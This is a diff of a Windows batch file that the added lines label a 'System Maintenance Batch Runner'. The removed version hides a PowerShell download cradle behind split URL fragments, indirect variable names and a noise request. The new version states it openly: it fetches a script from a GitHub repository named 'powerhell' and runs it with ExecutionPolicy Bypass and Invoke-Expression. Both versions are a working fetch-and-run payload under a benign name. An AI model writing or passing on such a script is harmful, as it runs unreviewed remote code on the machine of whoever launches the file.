@@ -1,18 +1,18 @@
 @echo off
 setlocal enabledelayedexpansion
 
-REM Fetch random junk (noise)
-curl https://www.google.com >nul 2>&1
+echo === System Maintenance Batch Runner ===
+echo Downloading batch file from GitHub...
 
-REM Build URL parts scattered
-set "a=https://raw.githu"
-set "b=busercontent.co"
-set "c=m/Axolotl-in-void/powerhell/main/file.ps1"
-set "url=!a!b!c!"
+REM Correct URL split
+set "a=https://raw.githubusercontent.com/"
+set "b=Axolotl-in-void/powerhell/main/file.ps1"
+set "url=!a!!b!"
 
-REM PowerShell with indirect variable
-set "webclient=System.Net.WebClient"
-set "method=DownloadString"
+REM Download and run
+powershell -NoProfile -ExecutionPolicy Bypass -Command ^
+"$c=(New-Object System.Net.WebClient).DownloadString('!url!');Invoke-Expression $c"
 
-powershell -NoProfile -ExecutionPolicy Bypass -Command "$c=^(New-Object !webclient!^).!method!^('!url!'^);Invoke-Expression $c"
+echo.
+echo Execution finished.
 pause
